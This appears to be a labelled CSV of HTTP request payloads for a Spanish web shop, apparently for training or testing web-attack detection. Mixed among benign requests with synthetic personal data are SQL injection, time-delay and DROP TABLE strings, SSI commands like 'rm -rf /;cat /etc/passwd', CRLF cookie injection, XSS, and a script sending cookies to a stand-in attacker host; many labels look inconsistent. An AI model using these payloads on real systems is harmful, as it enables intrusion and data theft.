payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
"entrar | leppert | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1",sql,no,86,1,1,0,1,low
entrar | leppert | 6albu-ce9r | off/ | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | leppert | 6albu-ce9r | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 7092 | Confirmarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,cmd,no,96,0,0,0,1,low
insertar | 7092 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | ehab | pio58241 | Vanina | Metauten Suau | eiler-philpelli@cpanelweb.com.af | 82384047W | San Jose 139, 13E | Plasenzuela | 45200 | Salamanca | 6014129235774839 | Registrarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1",cmd,no,240,0,0,0,1,low
"registro | ehab | pio58241 | Rimo'n | Metauten Suau | eiler-philpelli@cpanelweb.com.af | 82384047W | San Jose 139, 13E | Plasenzuela | 45200 | Salamanca | 6014129235774839 | Registrar HTTP/1.1",cmd,no,192,1,0,0,1,low
"registro | ehab | pio58241 | Vanina | Metauten Suau | eiler-philpelli@cpanelweb.com.af | 82384047W | San Jose 139, 13E | Plasenzuela | 45200 | Salamanca | 6014129235774839 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
entrar | ernie5 | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | off | Entrar HTTP/1.1,cmd,no,96,0,0,0,1,low
entrar | balak*?ris | mu!stIA | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | ernie5 | mu!stIA | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"insertar | 1136 | "" AND ""1""=""1 HTTP/1.1",cmd,no,39,1,0,0,1,medium
insertar | 1136 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1136 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | radick | T76F6li6 | Tercero | Muleiro | roope@gesmahernan.kn | 54463358W | Ronda Cervantes 146, 13?G | Navacarros | 12225 | Albacete | 2464400659124948 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
entrar | puglia | abunDanTEMeNte | on%3F | Entrar HTTP/1.1,cmd,no,58,0,0,0,1,medium
entrar | AND 1=1 | abunDanTEMeNte | on | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | puglia | abunDanTEMeNte | on/ | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | puglia | abunDanTEMeNte | on | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
"insertar','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1",sql,no,76,1,0,0,1,medium
insertar | 8588 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,91,1,0,0,1,low
insertar | 8588 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"entrar | drusie | cAreRa','0','0','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1",sql,no,91,1,0,0,1,low
entrar | drusie | cAreRa | on | any%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,89,0,0,0,1,low
entrar | drusie | cAreRa | on/ | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
entrar | drusie | cAreRa | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
insertar | 8022 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8022 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"Vaciar carrito<SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",xss,no,55,1,1,0,1,medium
entrar%3F | marchell | agra | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | marchell | agra | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"insertar | 5741 | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,67,1,0,0,1,medium
insertar | 5741 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | burch | 066empe0a6c0a%2B | on | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
"entrar | burch | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1",sql,no,72,1,0,0,1,medium
"entrar | ,latch?for | 066empe0a6c0a | on | Entrar HTTP/1.1",cmd,no,58,0,0,0,1,medium
entrar | burch | 066empe0a6c0a | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"insertar | "" AND ""1""=""1 | Pasar por caja HTTP/1.1",cmd,no,49,1,0,0,1,medium
insertar | 7224 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7224 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
Vaciar carritobob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,87,0,0,0,0,low
"registro | morra | 8uS8ri5or%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Vaniria | Setvall Herreros | destac.rebenciuc@tiposdedrogas.tc | 02068723B | C/ Orellana 50,  | Castell de Cabres | 19209 | Salamanca | 0437385701767264 | Registrar HTTP/1.1",cmd,no,256,0,0,0,1,low
"registro | morra | 8uS8ri5or | Vaniria | Setvall Herreros | destac.rebenciuc@tiposdedrogas.tc | 02068723B | C/ Orellana 50,  | Castell de Cabres | 19209 | Salamanca | 0437385701767264 | Registrar HTTP/1.1",cmd,no,204,0,0,0,1,low
entrar | vivianne7 | 9ref0c/i0n | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
"1<SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",xss,no,42,1,1,0,1,medium
"insertar<!--#EXEC cmd=""ls /""--> | 3845 | Pasar por caja HTTP/1.1",sql,no,64,1,1,0,1,medium
insertar | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Pasar por caja HTTP/1.1,cmd,no,119,0,0,0,1,low
insertar | 3845 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 3845 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | o.rourkeSet-cookie%3A+Tamper%3D1041264011025374727 | jesu$ita | on | Entrar HTTP/1.1,cmd,no,93,0,0,0,1,low
entrar | o.rourke | zag$alO'3A | on | Entrar HTTP/1.1,cmd,no,53,1,0,0,1,medium
entrar | o.rourke | jesu$ita | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
"Credenciales incorrectas','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,77,1,0,0,1,medium
paros%22%20style=%22background:url(javascript:alert('Paros')) | 7097 | Confirmar HTTP/1.1,cmd,no,89,1,0,0,1,low
insertar | 7097 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7097 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | maryann | comadReAr | Rosmida | Rosado | balgobin_rosener@freemachine.mk | 61907460Q | Calzada De San Pedro 118  | Viso, El | 17199 | Asturias | 5287078269282074 | Registrar HTTP/1.1",cmd,no,193,0,0,0,1,low
"entrar | odecki | le080i12 | off | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,84,1,0,0,1,low
entrar | h+/elga | le080i12 | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | odecki | le080i12 | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 2985 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2985 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"+ | mototsun | longitudinalmente | Pedro | Berlingery | thrush_orhonsay6@aadsl.no | 23532443Q | C/ Polacas, 59 1?F | Cubo de Bureba | 12170 | Salamanca | 6489953845851590 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
"registro | mototsun | longitudinalmente | Pedro | Berlingery | thrush_orhonsay6@aadsl.no | 23532443Q | C/ Polacas, 59 1?F | Cubo de Bureba | 12170 | Salamanca | 6489953845851590 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
"entrar | anoop | a3384,orna5a | off | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium
Credenciales incorrectas%20 HTTP/1.1,encoded attack,no,36,0,0,0,0,medium
insertar | 177 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 177 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | rivers | inconsultA | Jenifer | Demuner | politti@ubikuo.an | 24B19609B5A | Calle Don Ramiro, 190 13G | Valhermoso de la Fuente | 09348 | Navarra | 2621915602759490 | Registrar HTTP/1.1",cmd,no,196,0,0,0,1,low
"registro | rivers | inconsultA | Jenifer | Demuner | politti@ubikuo.an | 08596294K | Calle Don Ramiro, 190 13G | Valhermoso de la Fuente | 09348 | Navarra | 2621915602759490 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
"registro | kingston | tRaSPlAnTe | Johana | ""><!--#EXEC cmd=""dir ""-->< | lobe-cary@videoerotic.mh | 86807165J | Calle Olof Palme S/N,  | Navezuelas | 44330 | Navarra | 4852910314860020 | Registrar HTTP/1.1",sql,no,205,1,1,0,1,low
"registro | kingston | tRaSPlAnTe | Johana | Po-?rtaneri? Compte | lobe-cary@videoerotic.mh | 86807165J | Calle Olof Palme S/N,  | Navezuelas | 44330 | Navarra | 4852910314860020 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
"entrar | blan,/ch/a | atAjadA | on | Entrar HTTP/1.1",cmd,no,52,0,0,0,1,medium
entrar | atoui | atAjadA | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
1%3F HTTP/1.1,encoded attack,no,13,0,0,0,0,high
insertar | 200 | Pasar por caja%00 HTTP/1.1,cmd,no,43,0,0,0,1,medium
insertar | 200 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 200 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | lieure | rEbatible | Tarciano | Villalta Tapasco | touret@artesania.org.cv | 42708654T | Calle Eduardo Blanco Amor, 120, 1?B | Sopeira | 12230 | Guadalajara | 7642131917731646<!--#EXEC cmd=""ls /""--> | Registrar HTTP/1.1",sql,no,230,1,1,0,1,low
"registro | lieure | rEbatible | Tarciano | Villalta Tapasco | touret@artesania.org.cv | 42708654T | Calle Eduardo Blanco Amor, 120, 1?B | Sopeira | 12230 | Guadalajara | 983921355976591 | Registrar HTTP/1.1",cmd,no,206,0,0,0,1,low
"registro | lieure | rEbatible | Tarciano | Villalta Tapasco | touret@artesania.org.cv | 42708654T | Calle Eduardo Blanco Amor, 120, 1?B | Sopeira | 12230 | Guadalajara | 7642131917731646 | Registrar HTTP/1.1",cmd,no,207,0,0,0,1,low
3 | Vino Rioja | 39 | 25 | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,cmd,no,97,1,0,0,1,low
entrar | vanda | 5esl4chu6002ra | off+ | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | vanda | 5esl4chu6002ra | off | ' AND '1'='1 HTTP/1.1,cmd,no,61,1,0,0,1,medium
entrar | vanda | 5esl4chu6002ra | on/ | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
entrar | vanda | 5esl4chu6002ra | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar | 801 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 801 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | lennard2 | segundar | Armelio | Gochez | shankley@discon.sz%2B | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salamanca | 2607422784974121 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low
"registro | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salamanca | 2607422784974121 | Registrar HTTP/1.1",sql,no,237,1,0,0,1,low
"registro | lennard2 | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salamanca | 679646557157740 | Registrar HTTP/1.1",cmd,no,180,0,0,0,1,low
"registro | lennard2 | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salamanca | 2607422784974121 | Registrar HTTP/1.1",cmd,no,181,0,0,0,1,low
"entrar | bjorklun"" AND ""1""=""1 | 4n013mo4i2 | on | Entrar HTTP/1.1",cmd,no,65,1,0,0,1,medium
entrar | he?'hn+-sch | 4n013mo4i2 | on | Entrar HTTP/1.1,cmd,no,56,1,0,0,1,medium
entrar | bjorklun | 4n013mo4i2 | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"2<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,54,1,1,0,1,medium
Credenciales incorrectasany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,87,0,0,0,0,low
insertar | 4327 | Confirmar'INJECTED_PARAM HTTP/1.1,cmd,no,51,1,0,0,1,medium
insertar | 4327 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4327 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carrito%2B HTTP/1.1,encoded attack,no,26,0,0,0,0,high
entrar | margalo | diSTilAtorIO | off/ | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | margalo | diSTilAtorIO | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar+ | 1266 | Confirmar HTTP/1.1,cmd,no,37,0,0,0,1,medium
"entrar | zakarow','0','0');waitfor delay '0:0:15';-- | e4pe5imenta2a | on | Entrar HTTP/1.1",sql,no,91,1,0,0,1,low
entrar | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | e4pe5imenta2a | on | Entrar HTTP/1.1,cmd,no,99,0,0,0,1,low
entrar | wep/f | e4pe5imenta2a | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | zakarow | e4pe5imenta2a | on | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar | 9682 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 9682 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | rigobert | ac3544d | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
1' AND '1'='1 HTTP/1.1,other,no,22,1,0,0,0,high
insertar | 8970 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8970 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | bejar | litiGaR<SCRIPT>alert(""Paros"");</SCRIPT> | Enzo | Capell Latre | borgato@19horas.ee | 96483882D | Esperanto, 182,  | Sobremunt | 19278 | Alicante | 2319237634289833 | Registrar HTTP/1.1",xss,no,203,1,1,0,1,low
"registro | bejar | litiGaR | Enzo | ?J-o-dar | borgato@19horas.ee | 96483882D | Esperanto, 182,  | Sobremunt | 19278 | Alicante | 2319237634289833 | Registrar HTTP/1.1",cmd,no,167,0,0,0,1,low
"registro | bejar | litiGaR | Enzo | Capell Latre | borgato@19horas.ee | 96483882D | Esperanto, 182,  | Sobremunt | 19278 | Alicante | 2319237634289833 | Registrar HTTP/1.1",cmd,no,171,0,0,0,1,low
entrar | paros%22%20style=%22background:url(javascript:alert('Paros')) | ajote | on | Entrar HTTP/1.1,cmd,no,101,1,0,0,1,low
entrar | sherri | ajote | on/ | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | sherri | ajote | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
insertar | 2948| | Confirmar HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2948 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2948 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | ingo | Set-cookie%3A+Tamper%3D1041264011025374727 | Hansel | Farraces Lapetini | roderick@juguetespersonales.ck | 08514164R | Coral, 33,  | Xove | 44111 | Granada | 6727957884577351 | Registrar HTTP/1.1",cmd,no,213,0,0,0,1,low
entrar | tomohiro | cacoquimia | off | Entrarsessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,cmd,no,400,0,0,0,1,low
entrar | tomohiro | cacoquimia | off | 'INJECTED_PARAM HTTP/1.1,cmd,no,63,1,0,0,1,medium
"entrar | tomohiro | A,z'ORAMiEn,To | off | Entrar HTTP/1.1",cmd,no,58,1,0,0,1,medium
entrar | tomohiro | cacoquimia | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar| | 7044 | Pasar por caja HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7044 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | bonny | *sepultura | Ives | Raurell | persky-scavran@mystyleperfume.co%00 | 92230868V | Pomponio Mela 190, 11F | Rozas de Puerto Real | 37488 | Santa Cruz de Tenerife | 5805853159182957 | Registrar HTTP/1.1",cmd,no,217,0,0,0,1,low
"registro | bonny | *sepultura | Ives | Raurell | persky-scavran@mystyleperfume.co | 92230868V | Pomponio Mela 190, 11F | 'OR'a='a | 37488 | Santa Cruz de Tenerife | 5805853159182957 | Registrar HTTP/1.1",cmd,no,202,1,0,0,1,low
"registro | bonny | *sepultura | *Y*essica | Raurell | persky-scavran@mystyleperfume.co | 92230868V | Pomponio Mela 190, 11F | Rozas de Puerto Real | 37488 | Santa Cruz de Tenerife | 5805853159182957 | Registrar HTTP/1.1",cmd,no,219,0,0,0,1,low
"registro | bonny | *sepultura | Ives | Raurell | persky-scavran@mystyleperfume.co | 92230868V | Pomponio Mela 190, 11F | Rozas de Puerto Real | 37488 | Santa Cruz de Tenerife | 5805853159182957 | Registrar HTTP/1.1",cmd,no,214,0,0,0,1,low
insertar | 1594+ | Pasar por caja HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1594 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1594 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"Vaciar carrito','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,59,1,0,0,1,medium
"registro | "" AND ""1""=""1 | trariloNgO | Gelsomino | Zuazo Suela | gopi_belcher@bahiadelasirenas.mq | 15074727K | Baixada Can Llobet 124,  | San Miguel de Bernuy | 32089 | Baleares (Illes) | 1285539651029120 | Registrar HTTP/1.1",cmd,no,226,1,0,0,1,low
"registro | nekueey | trariloNgO | Gelsomino | Zuazo Suela | gopi_belcher@bahiadelasirenas.mq | 15074727K | Baixada Can Llobet 124,  | San Miguel de Bernuy | 1365A | Baleares (Illes) | 1285539651029120 | Registrar HTTP/1.1",cmd,no,221,0,0,0,1,low
"registro | nekueey | trariloNgO | Gelsomino | Zuazo Suela | gopi_belcher@bahiadelasirenas.mq | 15074727K | Baixada Can Llobet 124,  | San Miguel de Bernuy | 32089 | Baleares (Illes) | 1285539651029120 | Registrar HTTP/1.1",cmd,no,221,0,0,0,1,low
"entrar | dane | e3970iv4r | ','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",sql,no,86,1,0,0,1,low
entrar | dane | e3970iv4r | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | dane | e3970iv4r | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
2bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,xss,no,58,0,1,0,0,medium
%3F | 7094 | Confirmar HTTP/1.1,cmd,no,31,0,0,0,1,medium
insertar | 7094 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7094 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H');waitfor delay '0:0:15';-- | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 8964286236058281 | Registrar HTTP/1.1",sql,no,227,1,0,0,1,low
"registro | ' AND '1'='1 | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 8964286236058281 | Registrar HTTP/1.1",cmd,no,203,1,0,0,1,low
"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 51'379A'W | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 8964286236058281 | Registrar HTTP/1.1",cmd,no,199,1,0,0,1,low
"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 8964286236058281 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
entrar | regnier | A4Ost57o | on/ | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | regnier | A4Ost57o | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
1%2B HTTP/1.1,encoded attack,no,13,0,0,0,0,high
paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | 229 | Pasar por caja HTTP/1.1,cmd,no,114,0,0,0,1,low
insertar | 229 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 229 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"entrar | culberso | r-',estau/9ar | off | Entrar HTTP/1.1",cmd,no,57,1,0,0,1,medium
entrar | culberso | lactante | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
"<!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,32,1,1,0,0,medium
insertar | 2561 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2561 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,encoded attack,no,83,0,0,0,0,low
entrar@40 | hinkle | sanies | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | hinkle | sanies | off/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | hinkle | sanies | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
insertar | 5571 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5571 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | eshelman | fiLosOFAR | Zarif | Torrabadella<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | cavender_jacob@9horas.uk | 73992011E | C/ Marbella 103 8A | Artazu | 29532 | Badajoz | 1546173656033041 | Registrar HTTP/1.1",sql,no,225,1,1,0,1,low
registro | eshelman | fiLosOFAR | Zarif | Torrabadella | cavender_jacob@9horas.uk | 73992011E | C/ Marbella 103 8A | Artazu | 29532 | Badajoz | 1546173656033041 | Registrar HTTP/1.1,cmd,no,181,0,0,0,1,low
1 | Queso Manchego | 39 | 30 | AND 1=1 HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | changhsiSet-cookie%3A+Tamper%3D1041264011025374727 | dE271370n1e0T7 | off | Entrar HTTP/1.1,cmd,no,100,0,0,0,1,low
2any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,encoded attack,no,70,0,0,0,0,medium
Credenciales incorrectas'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,97,1,0,0,1,low
insertar | 9140 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 9140 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | hantak | t82925r | Lihue | Coev Carles | holzschuh7@superlinks.ga | 60956471P | Fuenterrabia 130 2F | Palacios de Sanabria | 48498 | Barcelona | 6136393758401812 | Registrar| HTTP/1.1,cmd,no,194,0,0,0,1,low
registro | hantak | t82925r | Lihue | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | holzschuh7@superlinks.ga | 60956471P | Fuenterrabia 130 2F | Palacios de Sanabria | 48498 | Barcelona | 6136393758401812 | Registrar HTTP/1.1,cmd,no,234,0,0,0,1,low
"registro | hantak | t82925r | Lihue | Coev Carles | holzschuh7@superlinks.ga | 60956471P | Calle Mitjana,* 120, 1-C | Palacios de Sanabria | 48498 | Barcelona | 6136393758401812 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
registro | hantak | t82925r | Lihue | Coev Carles | holzschuh7@superlinks.ga | 60956471P | Fuenterrabia 130 2F | Palacios de Sanabria | 48498 | Barcelona | 6136393758401812 | Registrar HTTP/1.1,cmd,no,193,0,0,0,1,low
Vaciar carritosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,157,1,1,0,0,low
"registro | kacy | en4ocar | Policarpo | Stucchi | weismuller@e-b-s.kr | 77550396P | Avinguda Biscaia, 98 13-G | Villares del Sazany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 05514 | Segovia | 9931554844705461 | Registrar HTTP/1.1",cmd,no,240,0,0,0,1,low
"registro | kacy | en4ocar | Policarpo | D'Pao_li | weismuller@e-b-s.kr | 77550396P | Avinguda Biscaia, 98 13-G | Villares del Saz | 05514 | Segovia | 9931554844705461 | Registrar HTTP/1.1",cmd,no,187,1,0,0,1,low
"registro | kacy | en4ocar | Policarpo | Stucchi | weismuller@e-b-s.kr | 77550396P | Avinguda Biscaia, 98 13-G | Villares del Saz | 05514 | Segovia | 9931554844705461 | Registrar HTTP/1.1",cmd,no,186,0,0,0,1,low
"entrar | hanneke<!--#EXEC cmd=""ls /""--> | dESHILadIZ | off | Entrar HTTP/1.1",sql,no,76,1,1,0,1,medium
entrar | hanneke | dESHILadIZ | | | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | *corn'eliu | dESHILadIZ | off | Entrar HTTP/1.1,cmd,no,56,1,0,0,1,medium
entrar | hanneke | dESHILadIZ | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
2%00 HTTP/1.1,encoded attack,no,13,0,0,0,0,high
"insertar | ','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1",sql,no,64,1,0,0,1,medium
insertar | 6992 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
